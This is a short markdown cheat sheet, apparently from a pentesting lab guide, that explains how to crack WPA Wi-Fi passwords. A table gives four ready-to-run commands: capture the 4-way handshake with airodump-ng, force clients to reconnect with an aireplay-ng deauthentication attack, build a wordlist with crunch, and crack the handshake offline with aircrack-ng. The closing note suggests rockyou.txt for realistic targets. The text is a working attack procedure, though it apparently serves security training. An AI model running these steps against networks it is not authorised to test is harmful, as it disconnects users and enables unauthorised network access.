# WPA

Unlike WEP, WPA can't be broken through statistical IV analysis. Instead, the attack captures a 4-way handshake during client authentication and cracks it offline using a wordlist. A deauth attack is used to force a client to reconnect, guaranteeing a handshake capture. Assumes the wireless adapter is already in monitor mode (see Deauthentication).

## Attack

| Command | Description |
|---|---|
| `airodump-ng --channel [channel no] --bssid [BSSID] --write handshake-file wlan0mon` | Captures traffic from the target network while waiting for a handshake |
| `aireplay-ng --deauth 5 -a [BSSID] -c [STATION] wlan0mon` | Disconnects the target client, forcing it to reconnect and triggering a fresh handshake |
| `crunch 8 9 abc123 -o testwordlist` | Generates a custom wordlist for cracking |
| `aircrack-ng handshake-file-01.cap -w testwordlist` | Cracks the captured handshake against the wordlist |

**Note:** The wordlist generated with `crunch` here — limited to specific characters (a,b,c,1,2,3) — is suited for cracking a test password in a lab setting. In a more realistic scenario, a ready-made wordlist like `rockyou.txt` can be used instead.
